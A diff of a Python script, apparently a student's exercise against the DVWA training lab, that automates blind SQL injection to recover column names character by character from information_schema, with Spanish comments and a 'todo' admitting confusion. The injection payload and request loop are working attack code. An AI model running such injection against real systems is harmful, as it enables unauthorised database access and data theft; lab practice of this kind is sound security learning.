@@ -179,20 +179,18 @@ for nombreTabla, columnaIndex, longitud in longitudColumnasPorTabla:  # Usamos l
     nombreColumna = ""  # Inicializamos el nombre de la columna
     for posicion in range(1, longitud + 1):  # Usamos la longitud exacta conocida
         for ascii in range(32, 126):  # Caracteres imprimibles ASCII
-            # Inyección SQL para obtener cada carácter del nombre de la columna
             inyection = f"1' and (SELECT ascii(substr(column_name, {posicion}, 1)) FROM information_schema.columns WHERE table_schema='{nombreBase}' AND table_name='{nombreTabla}' LIMIT 1 OFFSET {columnaIndex - 1})={ascii} -- -"
-            # Realizar la solicitud al servidor
             response = requests.get(url=server + f"/vulnerabilities/sqli_blind/?id={inyection}&Submit=Submit#", headers={"Cookie": cookie})
-            
-            # Validar si el carácter es correcto
+            #todo No entiendo esto Validar si el carácter es correcto
             if "User ID exists in the database" in response.text:
                 nombreColumna += chr(ascii)  # Añadimos el carácter al nombre de la columna
 
     if nombreColumna:  # Si encontramos un nombre completo, lo almacenamos
         nombresColumnasPorTabla.append((nombreTabla, columnaIndex, nombreColumna))
+        #print("hola" , nombresColumnasPorTabla)
         print(f"La Columna {columnaIndex} de la tabla '{nombreTabla}' es: {nombreColumna}")
 
-# Imprimir el resultado final
+
 print("\nResultado final: Nombres de las columnas por tabla")
 for nombreTabla, columnaIndex, nombreColumna in nombresColumnasPorTabla:
     print(f"Tabla: {nombreTabla}, Columna {columnaIndex}: {nombreColumna}")
